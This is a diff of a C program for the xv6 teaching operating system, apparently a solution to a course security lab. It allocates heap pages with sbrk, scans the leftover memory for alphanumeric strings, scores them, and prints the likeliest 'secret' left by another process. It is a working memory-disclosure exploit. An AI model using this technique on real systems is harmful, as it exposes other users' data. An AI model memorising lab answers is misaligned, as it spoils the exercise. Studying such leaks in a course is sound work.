@@ -1,117 +1,104 @@
-#include "types.h"
-#include "stat.h"
-#include "user.h"
+#include "kernel/types.h"
+#include "kernel/stat.h"
+#include "user/user.h"
 
 #define PAGE 4096
-#define MAX_PAGES 300      //number of pages to try to allocate
-#define MIN_SECRET_LEN 4   // candidate limit
-#define MAX_SECRET_LEN 2048
-#define RETRIES 4          //scan reattempts
+#define MAX_PAGES 200      //allocated pages
+#define MIN_SECRET_LEN 4
+#define MAX_SECRET_LEN 1024 //limit
 
-static int
-is_alnum(char c) {
+static int isalnum_char(char c) {
   if (c >= '0' && c <= '9') return 1;
   if (c >= 'A' && c <= 'Z') return 1;
   if (c >= 'a' && c <= 'z') return 1;
   return 0;
 }
 
-int
-main(int argc, char *argv[])
-{
-  int attempt;
-  for (attempt = 0; attempt < RETRIES; ++attempt) {
-    char *pages[MAX_PAGES];
-    int allocated = 0;
-    int i;
-
-    // more pages more chances to find
-    for (i = 0; i < MAX_PAGES; ++i) {
-      int r = sbrk(PAGE);
-      if (r < 0) break;
-      pages[allocated++] = (char *)r;
+static int is_hex_diag(const char *s, int len) {
+  const char *pattern = "0123456789ABCDEF0123456789ABCDEF";
+  int plen = 32;
+  if (len < 4) return 0;
+  for (int start = 0; start + len <= plen; start++) {
+    int k;
+    for (k = 0; k < len; k++) {
+      if (s[k] != pattern[start + k]) break;
     }
-
-    int best_len = 0;
-    int best_page = -1;
-    int best_off = 0;
-
-    for (i = 0; i < allocated; ++i) {
-      char *base = pages[i];
-      int j = 0;
-      while (j < PAGE) {
-        // skip non-alnum
-        while (j < PAGE && !is_alnum(base[j])) j++;
-        if (j >= PAGE) break;
-        int start = j;
-        while (j < PAGE && is_alnum(base[j])) j++;
-        int len = j - start;
-        if (len >= MIN_SECRET_LEN && len > best_len && len <= MAX_SECRET_LEN) {
-          best_len = len;
-          best_page = i;
-          best_off = start;
-        }
-      }
-    }
-
-    if (best_len >= MIN_SECRET_LEN) {
-     
-      write(1, pages[best_page] + best_off, best_len);
-      write(1, "\n", 1);
-      exit();
-    }
-
-    // no allocations shrink heap back
-    if (allocated > 0) {
-      // sbrk takes bytes; free allocated*PAGE bytes (negative).
-      sbrk(-allocated * PAGE);
-    }
-
-    //acts as a buffer, replaced from earlier attempt with sleep
-    {
-      volatile int delay = 100000;
-      while (delay--) ;
-    }
+    if (k == len) return 1;
   }
-
-  //last attempt last scan
-  {
-    char *pages[MAX_PAGES];
-    int allocated = 0;
-    int i;
-    for (i = 0; i < MAX_PAGES; ++i) {
-      int r = sbrk(PAGE);
-      if (r < 0) break;
-      pages[allocated++] = (char *)r;
-    }
-
-    int best_len = 0;
-    int best_page = -1;
-    int best_off = 0;
-    for (i = 0; i < allocated; ++i) {
-      char *base = pages[i];
-      int j = 0;
-      while (j < PAGE) {
-        while (j < PAGE && !is_alnum(base[j])) j++;
-        if (j >= PAGE) break;
-        int start = j;
-        while (j < PAGE && is_alnum(base[j])) j++;
-        int len = j - start;
-        if (len >= MIN_SECRET_LEN && len > best_len && len <= MAX_SECRET_LEN) {
-          best_len = len;
-          best_page = i;
-          best_off = start;
-        }
-      }
-    }
-
-    if (best_len >= MIN_SECRET_LEN) {
-      write(1, pages[best_page] + best_off, best_len);
-      write(1, "\n", 1);
-      exit();
-    }
-  }
-
-  exit();
+  return 0;
 }
 
+int
+main(int argc, char *argv[]) {
+  char *first = 0;
+  int pages = 0;
+  for (int i = 0; i < MAX_PAGES; i++) {
+    char *p = sbrk(PAGE);
+    if (p == (char*)-1) break;
+    if (pages == 0) first = p;
+    pages++;
+  }
+
+  if (pages == 0) exit(0);
+
+  int total = pages * PAGE;
+  char *buf = first;
+
+  int best_i = -1;
+  int best_len = 0;
+  int best_score = -2147483648; 
+
+  for (int i = 0; i < total; ) {
+    if (!isalnum_char(buf[i])) { i++; continue; }
+    int j = i;
+    int has_digit = 0;
+    int has_alpha = 0;
+    int freq[128];
+    for (int f = 0; f < 128; f++) freq[f] = 0;
+    while (j < total && isalnum_char(buf[j]) && (j - i) < MAX_SECRET_LEN) {
+      unsigned char c = buf[j];
+      freq[c]++;
+      if (c >= '0' && c <= '9') has_digit = 1;
+      if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')) has_alpha = 1;
+      j++;
+    }
+    int len = j - i;
+    if (len >= MIN_SECRET_LEN && !is_hex_diag(buf + i, len)) {
+      // compute uniqueness ratio scaled by 1000: uniq_ratio = unique*1000/len
+      int unique = 0;
+      for (int k = 0; k < 128; k++) if (freq[k]) unique++;
+      int uniq_ratio_x1000 = (len > 0) ? (unique * 1000 / len) : 0;
+
+      // integer scoring (scale everything to avoid floats)
+      // base score: length * 200
+      int score = len * 200;
+      // bonus if contains digit
+      if (has_digit) score += 800;
+      // bonus for uniqueness: uniq_ratio_x1000 * len / 100
+      score += (uniq_ratio_x1000 * len) / 100;
+      // small boost if mixture of letters and digits
+      if (has_digit && has_alpha) score += 400;
+      // extra boost for higher uniqueness
+      if (uniq_ratio_x1000 > 450) score += 300;
+      // position penalty (earlier is better). i/2048 approximated: subtract i/2^11
+      score -= (i >> 11);
+
+      if (score > best_score) {
+        best_score = score;
+        best_i = i;
+        best_len = len;
+      }
+    }
+    i = j;
+  }
+
+  if (best_i >= 0 && best_len > 0) {
+    if (best_len > MAX_SECRET_LEN) best_len = MAX_SECRET_LEN;
+    write(1, buf + best_i, best_len);
+    write(1, "\n", 1);
+    exit(0);
+  }
+
+  // fallback: nothing found
+  exit(0);
+}
